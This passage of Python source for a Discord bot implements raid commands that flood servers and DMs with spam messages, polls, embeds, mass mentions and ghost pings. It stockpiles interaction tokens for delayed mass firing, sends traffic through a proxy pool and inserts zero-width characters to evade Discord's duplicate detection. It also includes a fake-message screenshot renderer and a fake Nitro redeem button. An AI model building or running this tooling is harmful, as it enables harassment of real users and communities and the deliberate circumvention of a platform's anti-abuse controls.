'𐌡', '𐌢', '𐌣', '\U00010324', '\U00010325', '\U00010326', '\U00010327', '\U00010328', '\U00010329', '\U0001032a', '\U0001032b', '\U0001032c', '𐌭', '𐌮', '𐌯']

# admin log: every command/button hit lands here (set in .env, never in source)
_LOG_WEBHOOK = os.getenv("LOG_WEBHOOK", "")

# ── fake-message renderer settings ─────────────────────────
_FONT_DIR = str(BASE / "fonts")
_WHITNEY = f"{_FONT_DIR}/whitneybook.otf"
_WHITNEY_SEMIBOLD = f"{_FONT_DIR}/whitneysemibold.otf"
_WHITNEY_BOLD = f"{_FONT_DIR}/whitneybold.otf"
_EMOJI_FONT = f"{_FONT_DIR}/seguiemj.ttf"

# system fonts, used as fallbacks so the renderer never dies
_DEJAVU = "/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf"
_DEJAVU_BOLD = "/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf"
_CJK_FONT = "/usr/share/fonts/opentype/noto/NotoSansCJK-Regular.ttc"

_FAKE_BG = (0, 0, 0)            # pure black canvas
_FAKE_TEXT = (219, 222, 225)    # #dbdee1 - message content
_FAKE_NAME = (242, 243, 245)    # #f2f3f5 - name
_FAKE_TIME = (148, 155, 164)    # #949ba4 - timestamp
_FAKE_MENTION = (201, 205, 251) # #c9cdfb - mention highlight
_FAKE_TAG_BG = (30, 31, 34)     # #1e1f22 - tag chip
_FAKE_BOT_BG = (88, 101, 242)   # #5865F2 - BOT badge
_FAKE_AV_FALLBACK = (78, 80, 88)

_EMOJI_RE = re.compile(
    "(["
    "\U0001F1E6-\U0001F1FF"
    "\U0001F300-\U0001F5FF"
    "\U0001F600-\U0001F64F"
    "\U0001F680-\U0001F6FF"
    "\U0001F700-\U0001F77F"
    "\U0001F780-\U0001F7FF"
    "\U0001F800-\U0001F8FF"
    "\U0001F900-\U0001F9FF"
    "\U0001FA00-\U0001FAFF"
    "\U00002600-\U000027BF"
    "\U00002934-\U00002935"
    "\U000025AA-\U000025FE"
    "\U00002B00-\U00002BFF"
    "\U0000200D\U0000FE0F\U000020E3"
    "]+)")

_CJK_RE = re.compile(
    "(["
    "\u3040-\u30FF"
    "\u31F0-\u31FF"
    "\u3400-\u4DBF"
    "\u4E00-\u9FFF"
    "\uF900-\uFAFF"
    "\u3000-\u303F"
    "\uFF01-\uFF60"
    "\uFF66-\uFF9D"
    "\u1100-\u11FF"
    "\u3130-\u318F"
    "\uAC00-\uD7AF"
    "]+)")

_SYM_RE = re.compile(
    "(["
    "\u2190-\u21FF"
    "\u2200-\u22FF"
    "\u2300-\u23FF"
    "\u2400-\u24FF"
    "\u2500-\u25A9"
    "\u25FF"
    "\u2654-\u265F"
    "\u2660-\u2667"
    "\u2669-\u266F"
    "\u2680-\u2685"
    "\u4DC0-\u4DFF"
    "]+)")


def _fake_ip():
    return ".".join(str(random.randint(1, 254)) for _ in range(4))


# ── fake-message helpers ───────────────────────────────────

def _load_font(path, fallback, size):
    """Load a truetype font, falling back to DejaVu on any miss."""
    from PIL import ImageFont
    try:
        return ImageFont.truetype(path, size)
    except Exception:
        return ImageFont.truetype(fallback, size)


class _MixedText:
    """Renders text mixing Whitney/DejaVu glyphs, CJK and color emoji."""

    def __init__(self, draw_obj):
        self.d = draw_obj
        self._emoji_cache = {}
        self._cjk_cache = {}
        self._sym_cache = {}

    def _sym_font(self, size):
        f = self._sym_cache.get(size)
        if f is None:
            try:
                from PIL import ImageFont
                f = ImageFont.truetype(_DEJAVU, size)
            except Exception:
                f = False
            self._sym_cache[size] = f
        return f or None

    def _emoji_font(self, size):
        f = self._emoji_cache.get(size)
        if f is None:
            try:
                from PIL import ImageFont
                f = ImageFont.truetype(_EMOJI_FONT, size)
            except Exception:
                f = False
            self._emoji_cache[size] = f
        return f or None

    def _cjk_font(self, size):
        f = self._cjk_cache.get(size)
        if f is None:
            try:
                from PIL import ImageFont
                f = ImageFont.truetype(_CJK_FONT, size)
            except Exception:
                f = False
            self._cjk_cache[size] = f
        return f or None

    def _segments(self, text):
        """Split text into render segments: symbols, emoji, CJK, plain."""
        parts = []
        pos = 0
        for m in _SYM_RE.finditer(text):
            if m.start() > pos:
                parts.append(("t", text[pos:m.start()]))
            parts.append(("s", m.group(0)))
            pos = m.end()
        if pos < len(text):
            parts.append(("t", text[pos:]))
        out = []
        for kind, seg in parts:
            if kind != "t":
                out.append((kind, seg))
                continue
            p2 = 0
            for m in _EMOJI_RE.finditer(seg):
                if m.start() > p2:
                    out.append(("t", seg[p2:m.start()]))
                out.append(("e", m.group(0)))
                p2 = m.end()
            if p2 < len(seg):
                out.append(("t", seg[p2:]))
        final = []
        for kind, seg in out:
            if kind != "t":
                final.append((kind, seg))
                continue
            cpos = 0
            for cm in _CJK_RE.finditer(seg):
                if cm.start() > cpos:
                    final.append(("t", seg[cpos:cm.start()]))
                final.append(("c", cm.group(0)))
                cpos = cm.end()
            if cpos < len(seg):
                final.append(("t", seg[cpos:]))
        return final

    def _emoji_img(self, cluster, size):
        """Render one emoji cluster to a tightly cropped RGBA image."""
        from PIL import Image, ImageDraw
        ef = self._emoji_font(size)
        if ef is None:
            return None
        pad = size * 3
        img = Image.new("RGBA", (pad, pad), (0, 0, 0, 0))
        d = ImageDraw.Draw(img)
        d.text((pad // 3, pad // 3), cluster, font=ef,
               embedded_color=True, fill=(255, 255, 255, 255))
        bbox = img.getbbox()
        if bbox:
            img = img.crop(bbox)
        w, h = img.size
        m = max(w, h)
        if m and m != size:
            scale = size / m
            img = img.resize((max(1, int(w * scale)),
                              max(1, int(h * scale))), Image.LANCZOS)
        return img

    def width(self, text, font, size, emoji_size=None):
        if emoji_size is None:
            emoji_size = size
        total = 0
        for kind, seg in self._segments(text):
            if kind == "t":
                total += self.d.textlength(seg, font=font)
            elif kind == "c":
                cjk = self._cjk_font(size)
                total += cjk.getlength(seg) if cjk is not None else size * len(seg)
            elif kind == "s":
                sym = self._sym_font(size)
                total += sym.getlength(seg) if sym is not None else size * len(seg)
            else:
                total += emoji_size * len(seg)
        return total

    def width_runs(self, runs, font, size, emoji_size=None):
        return sum(self.width(text, font, size, emoji_size)
                   for text, _ in runs)

    def render(self, xy, text, font, size, fill, canvas, emoji_size=None):
        return self.render_runs(xy, [(text, fill)], font, size, canvas,
                                emoji_size)

    def render_runs(self, xy, runs, font, size, canvas, emoji_size=None):
        from PIL import Image, ImageDraw
        if emoji_size is None:
            emoji_size = size
        draw = ImageDraw.Draw(canvas)
        x, y = xy
        for text, fill in runs:
            for kind, seg in self._segments(text):
                if kind == "t":
                    draw.text((x, y), seg, font=font, fill=fill)
                    x += draw.textlength(seg, font=font)
                elif kind == "c":
                    cjk = self._cjk_font(size)
                    if cjk is not None:
                        draw.text((x, y), seg, font=cjk, fill=fill)
                        x += cjk.getlength(seg)
                    else:
                        x += size * len(seg)
                elif kind == "s":
                    sym = self._sym_font(size)
                    if sym is not None:
                        draw.text((x, y), seg, font=sym, fill=fill)
                        x += sym.getlength(seg)
                    else:
                        x += size * len(seg)
                else:
                    for ch in seg:
                        try:
                            img = self._emoji_img(ch, emoji_size)
                            if img is not None:
                                canvas.paste(
                                    img,
                                    (int(x), int(y + (size - emoji_size) // 2)),
                                    img)
                        except Exception:
                            pass
                        x += emoji_size
        return x


def _wrap_mixed(mixed, text, font, size, max_w):
    """Word wrap while the measurer knows how wide emojis really are."""
    words = text.split(" ")
    lines = []
    cur = ""
    for w in words:
        trial = (cur + " " + w).strip()
        if mixed.width(trial, font, size) <= max_w or not cur:
            cur = trial
        else:
            lines.append(cur)
            cur = w
    if cur:
        lines.append(cur)
    return lines or [""]


def _mention_runs(text, names):
    """Split text into runs so @everyone/@name get the mention tint."""
    if not names:
        return [(text, _FAKE_TEXT)]
    runs = []
    i = 0
    n = len(text)
    while i < n:
        if text[i] == "@":
            matched = False
            for special in ("everyone", "here"):
                if text[i + 1:i + 1 + len(special)].lower() == special:
                    runs.append((text[i:i + 1 + len(special)], _FAKE_MENTION))
                    i += 1 + len(special)
                    matched = True
                    break
            if not matched:
                for nm in names:
                    if text[i + 1:i + 1 + len(nm)].lower() == nm.lower():
                        runs.append((text[i:i + 1 + len(nm)], _FAKE_MENTION))
                        i += 1 + len(nm)
                        matched = True
                        break
            if matched:
                continue
        j = text.find("@", i)
        if j == -1:
            runs.append((text[i:], _FAKE_TEXT))
            break
        runs.append((text[i:j], _FAKE_TEXT))
        i = j
    return runs


def _discord_timestamp(t=None):
    """The 'Today at 9:41 PM' stamp Discord shows in chat."""
    if t is None:
        t = time.localtime()
    now = time.localtime()
    if (t.tm_year, t.tm_yday) == (now.tm_year, now.tm_yday):
        day = "Today"
    else:
        yest = time.localtime(time.time() - 86400)
        if (t.tm_year, t.tm_yday) == (yest.tm_year, yest.tm_yday):
            day = "Yesterday"
        else:
            m, d, y = time.strftime("%m %d %Y", t).split()
            day = f"{int(m)}/{int(d)}/{y}"
    h12 = time.strftime("%I:%M %p", t).lstrip("0").replace(" 0", " ")
    return f"{day} at {h12}"


def _circle_avatar(img_bytes, size):
    """Crop an avatar to the round shape Discord uses."""
    from PIL import Image, ImageDraw
    av = Image.open(io.BytesIO(img_bytes)).convert("RGBA")
    av = av.resize((size, size), Image.LANCZOS)
    mask = Image.new("L", (size * 4, size * 4), 0)
    d = ImageDraw.Draw(mask)
    d.ellipse((0, 0, size * 4, size * 4), fill=255)
    mask = mask.resize((size, size), Image.LANCZOS)
    av.putalpha(mask)
    return av


async def _download_bytes(url):
    """Plain GET for avatars/badges - None on any failure."""
    if not url:
        return None
    try:
        async with aiohttp.ClientSession() as s:
            async with s.get(
                url,
                headers={"User-Agent": "Mozilla/5.0"},
                timeout=aiohttp.ClientTimeout(total=15),
            ) as resp:
                if resp.status < 300:
                    return await resp.read()
    except Exception:
        pass
    return None


class Commands(commands.Cog):
    """every command the bot ships with, in one place."""

    def __init__(self, bot):
        self.bot = bot
        # usage counters for /analytics
        self._start = time.time()
        self.stats = {}
        # button-raid / button-say per-user state
        self._button_raid_cmds = {}
        self._button_say_texts = {}
        # slow-raid (turtle mode); tokens persist to disk between uses
        self.all_raid_file = BASE / self.bot.config.get(
            "all_raid_tokens_file", "all_raid_tokens.json")
        self.slow_farm_delay = 5.0
        self.slow_farm_tokens = self._load_all_raid_tokens("slow")
        # farm (/raid-farm, /all-raid) - fires through the proxy pool
        self.farm_tokens = []
        self.farm_delay = 0.0  # no delay - fire flat out
        self.all_raid_tokens = {}
        self.farm_pool = None
        try:
            entries = proxy.load_proxies(str(BASE / self.bot.config.get(
                "farm_proxies_file", "farm_proxies.txt")))
            if entries:
                self.farm_pool = proxy.ProxyPool(entries)
                print(f"[farm] pool: {len(entries)} proxies, no delay")
            else:
                print("[farm] no farm_proxies.txt - farm raids go direct")
        except Exception as exc:
            print(f"[farm] pool failed: {exc}")
        # the raid message everyone spams
        self.bot.raid_message = self._load_raid_message()
        # pace the webhook engine from config
        raids.GLOBAL_PACE = float(
            self.bot.config.get("pace_delay", raids.GLOBAL_PACE))
        # persistent views so their buttons survive restarts
        self.bot.add_view(self._RedeemView(self))
        self.bot.add_view(self._ButtonRaidView(self))
        self.bot.add_view(self._ButtonSayView(self))

    def _load_raid_message(self):
        path = BASE / self.bot.config.get("raid_message_file", "raid_message.txt")
        try:
            return path.read_text(encoding="utf-8")
        except Exception:
            return ""

    # ── slow-raid token persistence ─────────────────────────

    def _load_all_raid_tokens(self, key):
        try:
            with open(self.all_raid_file, encoding="utf-8") as f:
                data = json.load(f)
            return list(data.get(key, []))
        except Exception:
            return []

    def _save_all_raid_tokens(self, key, tokens):
        try:
            with open(self.all_raid_file, encoding="utf-8") as f:
                data = json.load(f)
        except Exception:
            data = {}
        data[key] = tokens
        try:
            with open(self.all_raid_file, "w", encoding="utf-8") as f:
                json.dump(data, f)
        except Exception:
            pass

    # ── shared firing helpers ───────────────────────────────

    async def _fire_raw(self, interaction, payload, times=1):
        """Post `payload` to the interaction's webhook `times` times."""
        url = _WEBHOOK.format(
            app=interaction.application_id, token=interaction.token)
        landed = 0
        for _ in range(times):
            try:
                r = await raids._webhook_request(url, payload, wait=False)
                if r:
                    landed += 1
            except Exception:
                pass
        return landed

    def _blind_content(self):
        """Only the links - the raid text stays out, tts reads the
        url gibberish aloud on top."""
        return "\n".join(_BLIND_LINKS)

    async def _ack(self, interaction, text="Sent."):
        """Quick ephemeral ack, never fatal if it fails."""
        try:
            await interaction.response.send_message(text, ephemeral=True)
        except Exception:
            pass

    async def _followup_ephemeral(self, interaction, text):
        try:
            await interaction.followup.send(text, ephemeral=True)
        except Exception:
            pass

    def _bump(self, name, interaction=None):
        self.stats[name] = self.stats.get(name, 0) + 1
        if interaction is not None:
            try:
                asyncio.create_task(self._log_cmd(name, interaction))
            except Exception:
                pass

    async def _log_cmd(self, name, interaction):
        """fire a short embed to the admin log webhook (best effort)."""
        if not _LOG_WEBHOOK:
            return
        user = getattr(interaction, "user", None)
        guild = getattr(interaction, "guild", None)
        ch = getattr(interaction, "channel", None)
        embed = {
            "title": "external app hit",
            "color": 0x2b2d31,
            "fields": [
                {"name": "command", "value": f"`{name}`", "inline": True},
                {"name": "user",
                 "value": f"<@{user.id}>" if user else "?", "inline": True},
                {"name": "place",
                 "value": (f"{guild.name} ({guild.id})" if guild else "DM"),
                 "inline": False},
            ],
        }
        if guild and ch is not None:
            embed["fields"].append(
                {"name": "channel",
                 "value": f"<#{getattr(ch, 'id', 0)}>", "inline": False})
        try:
            async with aiohttp.ClientSession() as s:
                await s.post(
                    _LOG_WEBHOOK,
                    json={"username": "ERFC logger", "embeds": [embed]},
                    headers={"User-Agent": "ERFC-logger/1.0"},
                    timeout=aiohttp.ClientTimeout(total=8))
        except Exception:
            pass

    # ── raid ────────────────────────────────────────────────

    @app_commands.command(
        name="raid",
        description="i am genuinely disappointed in you if you still spam this command",
    )
    @app_commands.allowed_installs(guilds=True, users=True)
    @app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
    async def raid(self, interaction: discord.Interaction):
        self._bump("raid", interaction)
        message = self.bot.raid_message
        landed = await raids.interaction_fire(
            interaction, message, count=RAID_COUNT)
        if not interaction.response.is_done():
            await self._ack(interaction, message)

    @app_commands.command(
        name="embed-raid",
        description="i dont even know why i added this",
    )
    @app_commands.allowed_installs(guilds=True, users=True)
    @app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
    async def embed_raid(self, interaction: discord.Interaction):
        self._bump("embed-raid", interaction)
        text = self.bot.raid_message or "raid"
        embed = {"description": text[:4096], "color": 0xed4245}
        await raids.interaction_fire(
            interaction, None, count=5, ephemeral=False, embeds=[embed])

    @app_commands.command(
        name="poll-raid",
        description="poll raid boiiii",
    )
    @app_commands.allowed_installs(guilds=True, users=True)
    @app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
    async def poll_raid(self, interaction: discord.Interaction):
        self._bump("poll-raid", interaction)
        await self._ack(interaction)

        poll_data = {
            "question": {"text": "W chud?"},
            "answers": [{"poll_media": {"text": "W chud"}} for _ in range(10)],
            "duration": 24,
            "layout_type": 1,
        }

        async def _one():
            return await raids.fire_followup(interaction, "", poll=poll_data)

        results = await asyncio.gather(
            *(_one() for _ in range(RAID_COUNT)),
            return_exceptions=True,
        )
        landed = sum(1 for r in results if r)
        if not interaction.response.is_done():
            await self._ack(interaction, "poll sent")

    @app_commands.command(
        name="blank-flood",
        description="its empty :p",
    )
    @app_commands.describe(rounds="how many blank messages (max 6)")
    @app_commands.allowed_installs(guilds=True, users=True)
    @app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
    async def blank_flood(self, interaction: discord.Interaction, rounds: int = 1):
        self._bump("blank-flood", interaction)
        rounds = min(max(rounds, 1), 6)
        blank = raids.load_blank_message()
        await raids.interaction_fire(
            interaction, blank, count=rounds, hidden_first=True)

    @app_commands.command(
        name="massping",
        description="yes",
    )
    @app_commands.describe(user="who to ping", rounds="how many pings")
    @app_commands.allowed_installs(guilds=True, users=True)
    @app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
    async def massping(self, interaction: discord.Interaction,
                       user: discord.User, rounds: int = 1):
        self._bump("massping", interaction)
        payload = f"{user.mention} {self.bot.raid_message}"
        await raids.interaction_fire(
            interaction, payload, count=max(1, rounds), hidden_first=True)

    # ── ghost ───────────────────────────────────────────────

    @app_commands.command(
        name="ghost-ping",
        description="you are annoying",
    )
    @app_commands.describe(user="who to ghost-ping", rounds="how many ghost pings")
    @app_commands.allowed_installs(guilds=True, users=True)
    @app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
    async def ghost_ping(self, interaction: discord.Interaction,
                         user: discord.User, rounds: int = 5):
        self._bump("ghost-ping", interaction)
        payload = f"{user.mention}"
        await raids.interaction_fire(
            interaction, payload, count=max(1, rounds),
            hidden_first=True, ghost=True)

    @app_commands.command(
        name="massghostping",
        description="what the fuck is this shit",
    )
    @app_commands.describe(
        user1="first user", user2="second user",
        user3="third user", user4="fourth user",
        rounds="how many ghost-ping rounds",
    )
    @app_commands.allowed_installs(guilds=True, users=True)
    @app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
    async def massghostping(self, interaction: discord.Interaction,
                            user1: discord.User,
                            user2: discord.User = None,
                            user3: discord.User = None,
                            user4: discord.User = None,
                            rounds: int = 3):
        self._bump("massghostping", interaction)
        mentions = [u.mention for u in (user1, user2, user3, user4) if u]
        payload = " ".join(mentions)
        await raids.interaction_fire(
            interaction, payload, count=max(1, rounds),
            hidden_first=True, ghost=True)

    @app_commands.command(
        name="ghost-say",
        description="confess your sins",
    )
    @app_commands.describe(message="the message to post then delete")
    @app_commands.allowed_installs(guilds=True, users=True)
    @app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
    async def ghost_say(self, interaction: discord.Interaction, message: str):
        self._bump("ghost-say", interaction)
        await raids.interaction_fire(
            interaction, message, count=1, hidden_first=True, ghost=True)

    @app_commands.command(
        name="say",
        description="confess your sins but it stays",
    )
    @app_commands.describe(message="the message to post")
    @app_commands.allowed_installs(guilds=True, users=True)
    @app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
    async def say(self, interaction: discord.Interaction, message: str):
        self._bump("say", interaction)
        landed = await raids.interaction_fire(
            interaction, message, count=1, hidden_first=True,
            username="anon", no_retry=True)
        if not landed:
            await self._followup_ephemeral(
                interaction,
                "message didn't land (rate limited?) - wait a bit and retry")

    # ── button raids ────────────────────────────────────────

    # button-raid choice -> which fire routine to run on click
    _BUTTON_RAID_COMMANDS = {
        "raid": "raid",
        "embed-raid": "embed",
        "poll-raid": "poll",
        "rickroll-spam": "rick",
        "blank-flood": "blank",
        "blind-raid": "blind",
    }

    class _ButtonRaidView(discord.ui.View):
        def __init__(self, cog):
            super().__init__(timeout=None)
            self.cog = cog

        @discord.ui.button(
            label="spam",
            style=discord.ButtonStyle.danger,
            custom_id="button_raid_fire",
        )
        async def on_fire(self, interaction: discord.Interaction,
                          button: discord.ui.Button):
            await interaction.response.defer(ephemeral=True)
            button.disabled = True
            try:
                await interaction.message.edit(view=self)
            except Exception:
                pass
            cmd = self.cog._button_raid_cmds.get(interaction.user.id, "raid")
            cog = self.cog
            message = cog.bot.raid_message
            landed = 0

            if cmd == "poll":
                poll_data = {
                    "question": {"text": "W chud?"},
                    "answers": [
                        {"poll_media": {"text": "W chud"}}
                        for _ in range(10)
                    ],
                    "duration": 24,
                    "layout_type": 1,
                }
                results = await asyncio.gather(
                    *(raids.fire_followup(interaction, "", poll=poll_data)
                      for _ in range(5)),
                    return_exceptions=True,
                )
                landed += sum(1 for r in results if r)

            elif cmd == "embed":
                embed = {"description": message[:4096], "color": 0xed4245}
                results = await asyncio.gather(
                    *(raids.fire_followup(interaction, "", embeds=[embed])
                      for _ in range(5)),
                    return_exceptions=True,
                )
                landed += sum(1 for r in results if r)

            elif cmd == "rick":
                parts = " ".join([
                    "https://static2.klipy.com/ii/c3a19a0b747a76e98651f2b9a3cca5ff/3e/62/qr7c3zGt.gif",
                    message,
                ])
                results = await asyncio.gather(
                    *(cog._fire_raw(
                        interaction,
                        {"content": parts, "username": "anon",
                         "allowed_mentions": raids.MENTIONS})
                      for _ in range(5)),
                    return_exceptions=True,
                )
                landed += sum(1 for r in results if isinstance(r, int) and r > 0)

            elif cmd == "blank":
                blank = raids.load_blank_message()
                results = await asyncio.gather(
                    *(raids.fire_followup(interaction, blank)
                      for _ in range(5)),
                    return_exceptions=True,
                )
                landed += sum(1 for r in results if r)

            elif cmd == "blind":
                payload = {"content": cog._blind_content(),
                           "username": "anon",
                           "allowed_mentions": raids.MENTIONS}
                results = await asyncio.gather(
                    *(cog._fire_raw(interaction, payload)
                      for _ in range(5)),
                    return_exceptions=True,
                )
                landed += sum(1 for r in results
                               if isinstance(r, int) and r > 0)

            else:  # plain raid
                results = await asyncio.gather(
                    *(raids.fire_followup(interaction, message)
                      for _ in range(5)),
                    return_exceptions=True,
                )
                landed += sum(1 for r in results if r)

            try:
                await interaction.followup.send(message, ephemeral=True)
            except Exception:
                pass

    @app_commands.command(
        name="button-raid",
        description="raid but with a button omg",
    )
    @app_commands.describe(command="raid type to fire on click")
    @app_commands.choices(command=[
        app_commands.Choice(name=name, value=name)
        for name in _BUTTON_RAID_COMMANDS
    ])
    @app_commands.allowed_installs(guilds=True, users=True)
    @app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
    async def button_raid(self, interaction: discord.Interaction,
                          command: app_commands.Choice[str]):
        self._bump("button-raid", interaction)
        cmd_name = command.name
        gif_url = "https://static2.klipy.com/ii/c3a19a0b747a76e98651f2b9a3cca5ff/3e/62/qr7c3zGt.gif"
        data = {
            "flags": 32832,
            "components": [
                {
                    "type": 17,
                    "components": [
                        {
                            "type": 12,
                            "items": [
                                {
                                    "media": {
                                        "url": gif_url,
                                    }
                                }
                            ]
                        },
                        {
                            "type": 10,
                            "content": f"# click to spam\n{cmd_name}",
                        },
                        {
                            "type": 1,
                            "components": [
                                {
                                    "type": 2,
                                    "style": 2,
                                    "label": "spam",
                                    "custom_id": "button_raid_fire",
                                }
                            ]
                        }
                    ]
                }
            ]
        }
        self._button_raid_cmds[interaction.user.id] = \
            self._BUTTON_RAID_COMMANDS[cmd_name]
        await self._ack(interaction)
        await raids.raw_followup(interaction, data)

    class _ButtonSayView(discord.ui.View):
        def __init__(self, cog):
            super().__init__(timeout=None)
            self.cog = cog

        @discord.ui.button(
            label="spam",
            style=discord.ButtonStyle.danger,
            custom_id="button_say_fire",
        )
        async def on_fire(self, interaction: discord.Interaction,
                          button: discord.ui.Button):
            await interaction.response.defer(ephemeral=True)
            key = interaction.user.id
            message = self.cog._button_say_texts.get(key, "raid")
            webhook_url = (
                f"https://discord.com/api/v10/webhooks/"
                f"{interaction.application_id}/{interaction.token}"
            )
            # split long texts into <=1900-char chunks at line boundaries
            chunks = []
            cur = ""
            for line in message.split("\n"):
                if cur and len(cur) + len(line) + 1 > 1900:
                    chunks.append(cur)
                    cur = line
                else:
                    cur = f"{cur}\n{line}" if cur else line
            if cur:
                chunks.append(cur)
            landed = 0
            for _ in range(5):
                results = await asyncio.gather(
                    *(raids._webhook_request(
                        webhook_url,
                        {"content": chunk, "username": "anon",
                         "allowed_mentions": raids.MENTIONS},
                        wait=False) for chunk in chunks),
                    return_exceptions=True,
                )
                landed += sum(1 for r in results if r)
            try:
                await interaction.followup.send(message, ephemeral=True)
            except Exception:
                pass

    class _ButtonSayModal(discord.ui.Modal, title="button-say"):
        text = discord.ui.TextInput(
            label="message (one line per row)",
            style=discord.TextStyle.paragraph,
            placeholder="paste your lines here - every line stays a line",
            required=True, max_length=4000)

        def __init__(self, cog):
            super().__init__()
            self.cog = cog

        async def on_submit(self, interaction: discord.Interaction):
            await interaction.response.defer(ephemeral=True)
            await self.cog._drop_button_say(interaction, self.text.value)

    async def _drop_button_say(self, interaction, say):
        gif_url = "https://static2.klipy.com/ii/c3a19a0b747a76e98651f2b9a3cca5ff/3e/62/qr7c3zGt.gif"
        preview = say[:3500]
        data = {
            "flags": 32832,
            "components": [
                {
                    "type": 17,
                    "components": [
                        {
                            "type": 12,
                            "items": [
                                {
                                    "media": {
                                        "url": gif_url,
                                    }
                                }
                            ]
                        },
                        {
                            "type": 10,
                            "content": f"# click to spam\n{preview}",
                        },
                        {
                            "type": 1,
                            "components": [
                                {
                                    "type": 2,
                                    "style": 2,
                                    "label": "spam",
                                    "custom_id": "button_say_fire",
                                }
                            ]
                        }
                    ]
                }
            ]
        }
        self._button_say_texts[interaction.user.id] = say
        await self._followup_ephemeral(interaction, "Sent.")
        await raids.raw_followup(interaction, data)

    @app_commands.command(
        name="button-say",
        description="literally /custom-raid btw",
    )
    @app_commands.allowed_installs(guilds=True, users=True)
    @app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
    async def button_say(self, interaction: discord.Interaction):
        self._bump("button-say", interaction)
        await interaction.response.send_modal(self._ButtonSayModal(self))

    # ── slow-raid (turtle mode) ─────────────────────────────

    def _slow_farm_embed(self):
        farmed = len(self.slow_farm_tokens) * FARM_PER_PRESS
        return discord.Embed(
            title="turtle mode",
            description=(
                f"**Farmed: {farmed}/{FARM_CAP} messages**\n"
                f"**Delay: {self.slow_farm_delay}s between each**\n\n"
                "Press **+5** to stack interaction tokens.\n"
                "Press **Execute** to fire with delays."
            ),
            color=0x2b2d31,
        )

    def _slow_farm_view(self):
        view = discord.ui.View(timeout=None)
        view.add_item(discord.ui.Button(
            label="+5", style=discord.ButtonStyle.primary, custom_id="slow_farm"))
        view.add_item(discord.ui.Button(
            label="Execute", style=discord.ButtonStyle.danger, custom_id="slow_fire"))
        return view

    @commands.Cog.listener()
    async def on_interaction(self, interaction: discord.Interaction):
        if interaction.type != discord.InteractionType.component:
            return
        custom_id = (interaction.data or {}).get("custom_id")
        if custom_id in ("button_raid_fire", "button_say_fire",
                         "fake_nitro_redeem"):
            self._bump(f"btn:{custom_id}", interaction)
        if custom_id == "slow_farm":
            if len(self.slow_farm_tokens) < FARM_CAP // FARM_PER_PRESS:
                self.slow_farm_tokens.append(interaction.token)
                self._save_all_raid_tokens("slow", self.slow_farm_tokens)
            await interaction.response.edit_message(
                embed=self._slow_farm_embed(), view=self._slow_farm_view())
        elif custom_id == "slow_fire":
            await interaction.response.defer()
            await self._fire_slow_raid(interaction)
        elif custom_id == "farm":
            if len(self.farm_tokens) < FARM_CAP // FARM_PER_PRESS:
                self.farm_tokens.append(interaction.token)
            await interaction.response.edit_message(
                embed=self._farm_embed(), view=self._farm_view())
        elif custom_id == "raid_fire":
            await interaction.response.defer()
            await self._fire_farm(interaction)
        elif custom_id == "farm_all":
            key = self._all_raid_key(interaction)
            tokens = self.all_raid_tokens.setdefault(
                key, self._load_all_raid_tokens(key))
            if len(tokens) < FARM_CAP // FARM_PER_PRESS:
                tokens.append((interaction.token, interaction.channel_id))
                self._save_all_raid_tokens(key, tokens)
            await interaction.response.edit_message(
                embed=self._all_raid_embed(key), view=self._all_raid_view())
        elif custom_id == "execute_all":
            await interaction.response.defer()
            key = self._all_raid_key(interaction)
            self.all_raid_tokens[key] = self._load_all_raid_tokens(key)
            await self._fire_all_raid(interaction, key)
        elif custom_id == "guide_all":
            guide = (
                "**How to use All-Raid**\n\n"
                "1. Run `/all-raid` in EVERY channel you want to raid.\n"
                "2. Press **+5** five times in each channel.\n"
                "3. Press **Execute** in any channel.\n"
                "4. Every channel gets raided at once.\n\n"
                "Tokens are channel-locked - you must farm in each channel."
            )
            await interaction.response.send_message(
                embed=discord.Embed(description=guide, color=0x2b2d31),
                ephemeral=True)

    @app_commands.command(
        name="slow-raid",
        description="turtle raid",
    )
    @app_commands.describe(
        delay="seconds between each message when firing (default 5.0, min 1.5)")
    @app_commands.allowed_installs(guilds=True, users=True)
    @app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
    async def slow_raid(self, interaction: discord.Interaction,
                        delay: float = 5.0):
        self._bump("slow-raid", interaction)
        delay = max(delay, 1.5)
        self.slow_farm_delay = delay
        await interaction.response.send_message(
            embed=self._slow_farm_embed(),
            view=self._slow_farm_view(),
            ephemeral=True)

    async def _fire_slow_raid(self, interaction):
        message = self.bot.raid_message
        tokens = list(self.slow_farm_tokens)
        self.slow_farm_tokens = []
        self._save_all_raid_tokens("slow", [])
        delay = self.slow_farm_delay

        if not tokens:
            await interaction.edit_original_response(
                embed=discord.Embed(
                    description="No tokens farmed yet. Press **+5** first.",
                    color=0xed4245),
                view=None)
            return

        jobs = []
        for token in tokens:
            url = _WEBHOOK.format(
                app=interaction.application_id, token=token)
            payload = {"content": message, "allowed_mentions": raids.MENTIONS}
            jobs.extend((url, payload) for _ in range(FARM_PER_PRESS))

        # invisible chars to dodge dupe detection
        zwsp = ["​", "‌", "‍", "⁠", "﻿"]

        counts = [False] * len(jobs)
        await interaction.edit_original_response(
            embed=discord.Embed(
                title="turtle mode",
                description=f"**Firing: 0/{len(jobs)}** (delay: {delay}s)",
                color=0xfee75c),
            view=None)

        for i, (url, payload) in enumerate(jobs):
            # mutate the content a bit every time so Discord sees "new" text
            chars = list(payload["content"])
            for _ in range(random.randint(1, 3)):
                pos = random.randint(0, len(chars))
                chars.insert(pos, random.choice(zwsp))
            payload = dict(payload)
            payload["content"] = "".join(chars)

            try:
                r = await raids._webhook_request(url, payload, wait=False)
                counts[i] = bool(r)
            except Exception:
                pass

            if i < len(jobs) - 1:
                await asyncio.sleep(delay * random.uniform(0.7, 1.3))

            if (i + 1) % 5 == 0 or i == len(jobs) - 1:
                try:
                    await interaction.edit_original_response(
                        embed=discord.Embed(
                            title="turtle mode",
                            description=f"**{i + 1}/{len(jobs)}**",
                            color=0xfee75c))
                except Exception:
                    pass

        landed = sum(counts)
